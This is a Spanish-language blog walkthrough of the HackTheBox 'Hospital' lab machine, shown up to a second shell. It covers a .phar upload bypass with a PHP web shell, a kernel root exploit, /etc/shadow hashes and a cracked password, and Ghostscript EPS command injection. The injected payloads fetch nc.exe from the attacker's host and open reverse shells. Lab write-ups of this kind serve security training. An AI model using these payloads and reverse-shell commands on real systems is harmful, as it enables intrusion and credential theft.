<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Hospital (medium) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Hospital (medium)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-12T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Hospital (medium)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-05-12T00:00:00-06:00","datePublished":"2024-05-12T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Hospital (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Hospital (medium)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-05-12T00:00:00-06:00" itemprop="datePublished">
        May 12, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/e980d18b909fa0ba8f519cf9777fd413.png" />
</p>

<ul>
  <li>Hospital is a medium-difficulty Windows machine that hosts an Active Directory environment, a web server, and a RoundCube instance. The web application has a file upload vulnerability that allows the execution of arbitrary PHP code, leading to a reverse shell on the Linux virtual machine hosting the service. Enumerating the system reveals an outdated Linux kernel that can be exploited to gain root privileges, via CVE-2023-35001. Privileged access allows /etc/shadow hashes to be read and subsequently cracked, yielding credentials for the RoundCube instance. Emails on the service hint towards the use of GhostScript, which opens up the target to exploitation via , a vulnerability exploited by crafting a malicious Embedded PostScript (EPS) file to achieve remote code execution on the Windows host. System access is then obtained by either of two ways: using a keylogger to capture administrator credentials, or by abusing misconfigured XAMPP permissions.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo TCP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6616,6631,6647,9389 10.10.11.241 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-11 15:32 CST
Nmap scan report <span class="k">for </span>10.10.11.241
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-05-12 04:32:45Z<span class="o">)</span>
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-12T04:33:41+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Not valid before: 2024-05-10T04:42:39
|_Not valid after:  2024-11-09T04:42:39
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6616/tcp open  msrpc             Microsoft Windows RPC
6631/tcp open  msrpc             Microsoft Windows RPC
6647/tcp open  msrpc             Microsoft Windows RPC
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   <span class="nb">date</span>: 2024-05-12T04:33:44
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar los nombres de dominio que nos dio <code class="language-plaintext highlighter-rouge">Nmap</code> también que prácticamente son los mismos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.241 DC.hospital.htb hospital.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.241 DC.hospital.htb hospital.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.241 <span class="nt">--shares</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>-] Error enumerating shares: <span class="o">[</span>Errno 32] Broken pipe
➜  nmap cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'admin'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>-] hospital.htb<span class="se">\a</span>dmin: STATUS_LOGON_FAILURE
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.241 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Tampoco por el protocolo <code class="language-plaintext highlighter-rouge">RPC</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.241
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>En el puerto 443 vemos un panel de <code class="language-plaintext highlighter-rouge">login</code> credenciales por defecto no funcionan.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/1.png" />
</p>

<ul>
  <li>En el puerto <code class="language-plaintext highlighter-rouge">8080</code> tenemos un panel de <code class="language-plaintext highlighter-rouge">login</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/2.png" />
</p>

<ul>
  <li>
    <p>Vamos a crear una cuenta ya que no tenemos una para conectarnos.</p>
  </li>
  <li>
    <p>Una vez tenemos nuestra cuenta nos podemos conectar y algo ya que llama la atención es la parte de subir archivos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/3.png" />
</p>

<ul>
  <li>Como la pagina web interpreta <code class="language-plaintext highlighter-rouge">php</code> podemos intentar subir <code class="language-plaintext highlighter-rouge">.php</code> para ver si funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"&lt;?php system("</span><span class="nb">id</span><span class="s2">"); ?&gt;"</span> <span class="o">&gt;</span> test.php
</code></pre></div></div>

<ul>
  <li>Al subirlo me da error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/4.png" />
</p>

<ul>
  <li>
    <p>Vamos a probar con un <code class="language-plaintext highlighter-rouge">jpg</code>.</p>
  </li>
  <li>
    <p>Y funciona.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/5.png" />
</p>

<ul>
  <li>Vamos a ver si existe la ruta donde se suban las cosas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  content gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://hospital.htb:8080/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://hospital.htb:8080/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/images/]
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/uploads/]
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/css/]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/js/]
/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/vendor/]
/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/fonts/]
</code></pre></div></div>

<ul>
  <li>Y bueno lo mas probable es que no podremos ver nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/6.png" />
</p>

<ul>
  <li>
    <p>Lo que vamos hacer es capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> y ver que otras extensiones podemos usar para interpretar código <code class="language-plaintext highlighter-rouge">php</code>.</p>
  </li>
  <li>
    <p>Vamos a <code class="language-plaintext highlighter-rouge">fuzzear</code> por la extensión en el <code class="language-plaintext highlighter-rouge">intruder</code> de momento dejamos estas.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/7.png" />
</p>

<ul>
  <li>Si observamos la respuesta en <code class="language-plaintext highlighter-rouge">.phar</code> vemos que nos un <code class="language-plaintext highlighter-rouge">success.php</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/8.png" />
</p>

<blockquote>
  <p>En el software, un archivo PHAR es un formato de paquete que permite la distribución de aplicaciones y bibliotecas al agrupar muchos archivos de código PHP y otros recursos en un solo archivo.</p>
</blockquote>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>Ahora lo que vamos hacer es subir lo siguiente <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> pero lo pondremos en <code class="language-plaintext highlighter-rouge">.phar</code> para que pueda interpretarlo y así estar mas cómodos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/flozz/p0wny-shell
Cloning into <span class="s1">'p0wny-shell'</span>...
remote: Enumerating objects: 215, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>137/137<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>54/54<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 215 <span class="o">(</span>delta 94<span class="o">)</span>, reused 110 <span class="o">(</span>delta 82<span class="o">)</span>, pack-reused 78
Receiving objects: 100% <span class="o">(</span>215/215<span class="o">)</span>, 117.41 KiB | 626.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>124/124<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>p0wny-shell
➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>Dockerfile  LICENSE  README.md  RELEASE.rst  screenshot.png  shell.php
➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">mv </span>shell.php shell.phar
</code></pre></div></div>

<ul>
  <li>Después de subir el <code class="language-plaintext highlighter-rouge">.phar</code> como ya sabemos el nombre y la ruta donde guarda los archivos ya podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/9.png" />
</p>

<ul>
  <li>Ahora nos vamos enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/10.png" />
</p>

<ul>
  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6602
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>974<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@webserver:/var/www/html/uploads<span class="err">$</span>
</code></pre></div></div>

<h2 id="root">Root</h2>

<ul>
  <li>La versión del <code class="language-plaintext highlighter-rouge">kernel</code> es vieja y es vulnerable <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html/uploads<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-r</span>
5.19.0-35-generic
www-data@webserver:/var/www/html/uploads<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Al ejecutar el script nos convertiremos en <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x exploit.sh
www-data@webserver:/tmp<span class="nv">$ </span>./exploit.sh
<span class="o">[</span>+] You should be root now
<span class="o">[</span>+] Type <span class="s1">'exit'</span> to finish and leave the house cleaned
root@webserver:/tmp#
</code></pre></div></div>

<ul>
  <li>No hay nada interesante como una flag ni nada pero como somos <code class="language-plaintext highlighter-rouge">root</code> y el usuario <code class="language-plaintext highlighter-rouge">drwilliams</code> existe podemos ver el <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@webserver:/home/drwilliams# <span class="nb">cat</span> /etc/shadow

root:<span class="nv">$y$j9T$s</span>/Aqv48x449udndpLC6eC.<span class="nv">$WUkrXgkW46N4xdpnhMoax7US</span>.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:<span class="k">*</span>:19462:0:99999:7:::
bin:<span class="k">*</span>:19462:0:99999:7:::
sys:<span class="k">*</span>:19462:0:99999:7:::
<span class="nb">sync</span>:<span class="k">*</span>:19462:0:99999:7:::
games:<span class="k">*</span>:19462:0:99999:7:::
man:<span class="k">*</span>:19462:0:99999:7:::
lp:<span class="k">*</span>:19462:0:99999:7:::
mail:<span class="k">*</span>:19462:0:99999:7:::
news:<span class="k">*</span>:19462:0:99999:7:::
uucp:<span class="k">*</span>:19462:0:99999:7:::
proxy:<span class="k">*</span>:19462:0:99999:7:::
www-data:<span class="k">*</span>:19462:0:99999:7:::
backup:<span class="k">*</span>:19462:0:99999:7:::
list:<span class="k">*</span>:19462:0:99999:7:::
irc:<span class="k">*</span>:19462:0:99999:7:::
_apt:<span class="k">*</span>:19462:0:99999:7:::
nobody:<span class="k">*</span>:19462:0:99999:7:::
systemd-network:!<span class="k">*</span>:19462::::::
systemd-timesync:!<span class="k">*</span>:19462::::::
messagebus:!:19462::::::
systemd-resolve:!<span class="k">*</span>:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:<span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
root@webserver:/home/drwilliams#
</code></pre></div></div>

<h2 id="shell-as-drbrown">Shell as drbrown</h2>

<ul>
  <li>Obtenemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 512/512 AVX512BW 8x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
qwe123!@#        <span class="o">(</span>drwilliams<span class="o">)</span>
1g 0:00:01:04 DONE <span class="o">(</span>2024-05-11 16:52<span class="o">)</span> 0.01554g/s 3334p/s 3334c/s 3334C/s raycharles..pl@yboy
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Podemos usar las credenciales en el panel de administración.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/11.png" />
</p>

<ul>
  <li>Vemos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/12.png" />
</p>

<ul>
  <li>Encontramos información útil.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/13.png" />
</p>

<blockquote>
  <p>PostScript encapsulado, o EPS, es un formato de archivo gráfico. Un archivo EPS es un archivo PostScript que satisface algunas restricciones adicionales. Estas restricciones intentan hacer más fácil a programas de software el incluir un archivo EPS dentro de otro documento PostScript.</p>
</blockquote>

<ul>
  <li>El Dr. Brown quiere que le enviemos un archivo con la extensión <code class="language-plaintext highlighter-rouge">.eps</code>  y nos habla sobre <a href="https://www.ghostscript.com/">https://www.ghostscript.com/</a> que es el que interpreta el <code class="language-plaintext highlighter-rouge">PostScript</code> si investigamos sobre esto encontramos una vulnerabilidad en <code class="language-plaintext highlighter-rouge">Ghostscript</code> <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</a> en la que podemos hacer una inyección de comandos en un <code class="language-plaintext highlighter-rouge">.eps</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
Cloning into <span class="s1">'CVE-2023-36664-Ghostscript-command-injection'</span>...
remote: Enumerating objects: 34, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 34 <span class="o">(</span>delta 15<span class="o">)</span>, reused 5 <span class="o">(</span>delta 1<span class="o">)</span>, pack-reused 0
Receiving objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, 71.69 KiB | 407.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>15/15<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>CVE-2023-36664-Ghostscript-command-injection
➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
</span>CVE_2023_36664_exploit.py  README.md  file.eps  file.ps  flowchart.png  vsociety.jpg
➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> python3 CVE_2023_36664_exploit.py
<span class="o">[</span>-] Either <span class="nt">--payload</span> or <span class="nt">--revshell</span> is required.
</code></pre></div></div>

<ul>
  <li>Para ganar acceso necesitamos subir el ejecutable de <code class="language-plaintext highlighter-rouge">netcat</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"curl 10.10.14.71:80/nc.exe -o nc.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div>

<ul>
  <li>Ahora vamos a enviar el <code class="language-plaintext highlighter-rouge">.eps</code> al <code class="language-plaintext highlighter-rouge">Dr.Brown</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/14.png" />
</p>

<ul>
  <li>Una vez enviamos el mensaje nos llega la solicitud que descargo el <code class="language-plaintext highlighter-rouge">nc.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.241 - - <span class="o">[</span>11/May/2024 18:36:30] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Ahora nos vamos a enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"nc.exe 10.10.14.71 443 -e cmd.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div>

<ul>
  <li>
    <p>Y de igual manera enviamos por correo al mismo destinatario el <code class="language-plaintext highlighter-rouge">file.eps</code>.</p>
  </li>
  <li>
    <p>Nos llega la shell.</p>
  </li>
</ul>

